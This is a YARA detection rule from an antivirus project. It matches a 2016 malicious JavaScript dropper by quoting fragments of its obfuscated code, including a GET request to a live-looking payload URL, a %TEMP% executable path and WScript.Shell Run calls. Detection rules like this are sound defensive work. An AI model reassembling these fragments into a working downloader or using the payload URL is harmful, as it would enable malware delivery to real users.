rule sig_20160328_972536cbd7a8586dccef29390cdbacdf {
  meta:
    description = "datamaliciousorder - file 20160328_972536cbd7a8586dccef29390cdbacdf.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b0ad33d3cc60eefe7b770ef4bd7f2b74ece61c154c777b69ef41ff69a964e398"

  strings:
    $s1  = "function Rhahy() {return Vitgu[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"gLVy4EKs.exe\";};" fullword ascii
    $s2  = "do {WScript[Klyyhqie](Sfkoxtreb() * 11)} while (Kmhvwyo[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "var Vitgu = function Aalnqfo() {return WScript[Dnfgdidp](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Jecja(Rjahbxi, Dfwzilfu){return Rjahbxi - Dfwzilfu;};" fullword ascii
    $s5  = "Kmhvwyo[Xyyrvwcpz](\"GET\", \"http://energyunlimited.co.nz/o2apf\", false);" fullword ascii
    $s6  = "function Uoywko(Wxidjjq){Vitgu[\"Run\"](Wxidjjq, Hwoyawl, Hwoyawl);};" fullword ascii
    $s7  = "function Btlkrgzbmf() {return ((Gqnqxujsn == true) && (Gqnqxujsn == Jcdqeudd)) ? 1 : Hwoyawl;};" fullword ascii
    $s8  = "function Nugvzw(Akbcssxchy) {var Ixzpx = (1, 2, 3, 4, 5, Akbcssxchy); return Ixzpx;};" fullword ascii
    $s9  = "function Qnljatbkkn(){return Cnoqlreu;};" fullword ascii
    $s10 = "return Jecja(Zbwerxpjpc, Zmzoihof);" fullword ascii
    $s11 = "var Oiudr = new this[\"Date\"]();" fullword ascii
    $s12 = "var Gqnqxujsn = false;" fullword ascii
    $s13 = "Jcdqeudd = true; " fullword ascii
    $s14 = "function Nmmst()" fullword ascii
    $s15 = "var Divlvbz = false;" fullword ascii
    $s16 = "function Sfkoxtreb(){return 22;};" fullword ascii
    $s17 = "function Rnmztnrmbu(){return Dnfgdidp;};" fullword ascii
    $s18 = "Gqnqxujsn = true; " fullword ascii
    $s19 = " while (Fzgzbvt){" fullword ascii
    $s20 = "var Jcdqeudd = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}